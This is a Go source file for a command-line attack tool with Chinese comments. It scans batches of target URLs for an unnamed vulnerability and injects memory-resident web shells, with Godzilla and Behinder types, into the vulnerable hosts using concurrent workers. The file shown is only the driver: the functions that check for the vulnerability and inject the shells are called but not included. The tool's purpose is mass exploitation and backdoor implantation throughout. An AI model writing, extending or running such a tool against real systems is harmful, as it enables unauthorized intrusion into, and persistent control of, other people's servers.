package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"sync"
	"time"
)

var (
	checkMode  bool
	shellMode  bool
	shellType  string
	target     string
	urlFile    string
	outputFile string
	threads    int
)

func init() {
	flag.BoolVar(&checkMode, "check", false, "检测模式：验证目标是否存在漏洞")
	flag.BoolVar(&shellMode, "shell", false, "内存马模式：注入内存马")
	flag.StringVar(&shellType, "type", "basic", "内存马类型: basic(基础), godzilla(哥斯拉), behinder(冰蝎)")
	flag.StringVar(&target, "target", "", "目标URL (例如: http://example.com)")
	flag.StringVar(&urlFile, "file", "", "包含多个目标URL的文件路径")
	flag.StringVar(&outputFile, "output", "", "保存成功结果的文件路径 (默认: vulnerable_时间戳.txt)")
	flag.IntVar(&threads, "threads", 5, "并发线程数 (默认: 5)")
}

func main() {
	flag.Parse()

	if !checkMode && !shellMode {
		fmt.Println("请指定操作模式:")
		fmt.Println("  --check  : 检测漏洞")
		fmt.Println("  --shell  : 注入内存马")
		os.Exit(1)
	}

	if target == "" && urlFile == "" {
		fmt.Println("请指定目标: --target <URL> 或 --file <文件路径>")
		os.Exit(1)
	}

	var targets []string
	if target != "" {
		targets = append(targets, target)
	}
	if urlFile != "" {
		urls, err := readURLsFromFile(urlFile)
		if err != nil {
			log.Fatalf("读取URL文件失败: %v", err)
		}
		targets = append(targets, urls...)
	}

	if checkMode {
		log.Println("开始漏洞检测...")

		// 如果是批量检测，准备输出文件
		var outputFileName string
		var vulnerableTargets []VulnerableTarget
		var mu sync.Mutex

		if len(targets) > 1 {
			if outputFile == "" {
				// 使用默认文件名（包含时间戳）
				timestamp := time.Now().Format("20060102_150405")
				outputFileName = fmt.Sprintf("vulnerable_%s.txt", timestamp)
			} else {
				outputFileName = outputFile
			}
			log.Printf("批量检测模式 (并发线程数: %d)，成功结果将保存到: %s\n", threads, outputFileName)
		}

		// 使用并发执行检测
		if len(targets) > 1 {
			// 并发检测模式
			var wg sync.WaitGroup
			targetChan := make(chan string, len(targets))

			// 限制并发线程数不超过目标数
			actualThreads := threads
			if threads > len(targets) {
				actualThreads = len(targets)
			}

			// 启动工作线程
			for i := 0; i < actualThreads; i++ {
				wg.Add(1)
				go func(threadID int) {
					defer wg.Done()
					for url := range targetChan {
						result := checkVulnerability(url, &mu)
						if result.Vulnerable {
							mu.Lock()
							vulnerableTargets = append(vulnerableTargets, result)
							mu.Unlock()
						}
					}
				}(i)
			}

			// 发送任务
			for _, url := range targets {
				targetChan <- url
			}
			close(targetChan)

			// 等待完成
			wg.Wait()
			// 批量模式结束后打印换行
			fmt.Println()
		} else {
			// 单目标检测模式 - 不使用并发
			result := checkVulnerability(targets[0], nil)
			if result.Vulnerable {
				vulnerableTargets = append(vulnerableTargets, result)
			}
		}

		// 保存结果
		if len(targets) > 1 && len(vulnerableTargets) > 0 {
			if err := saveVulnerableTargets(outputFileName, vulnerableTargets); err != nil {
				log.Printf("[-] 保存结果失败: %v\n", err)
			} else {
				fmt.Printf("\n[+] 检测完成！发现 %d 个存在漏洞的目标\n", len(vulnerableTargets))
				fmt.Printf("[+] 结果已保存到: %s\n", outputFileName)
			}
		} else if len(targets) > 1 {
			fmt.Printf("\n[-] 检测完成！未发现存在漏洞的目标\n")
		}
	}

	if shellMode {
		// 验证内存马类型
		if shellType != "basic" && shellType != "godzilla" && shellType != "behinder" {
			fmt.Printf("错误: 不支持的内存马类型 '%s'\n", shellType)
			fmt.Println("支持的类型: basic, godzilla, behinder")
			os.Exit(1)
		}

		log.Printf("开始注入内存马 (类型: %s, 并发线程数: %d)...\n", shellType, threads)

		// 单目标或批量注入
		if len(targets) > 1 {
			// 批量注入使用并发
			var wg sync.WaitGroup
			targetChan := make(chan string, len(targets))

			// 启动工作线程
			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func(threadID int) {
					defer wg.Done()
					for url := range targetChan {
						injectMemoryShell(url, shellType)
					}
				}(i)
			}

			// 发送任务
			for _, url := range targets {
				targetChan <- url
			}
			close(targetChan)

			// 等待完成
			wg.Wait()
			fmt.Printf("[+] 所有目标注入完成！\n")
		} else {
			// 单目标注入
			injectMemoryShell(targets[0], shellType)
		}
	}
}
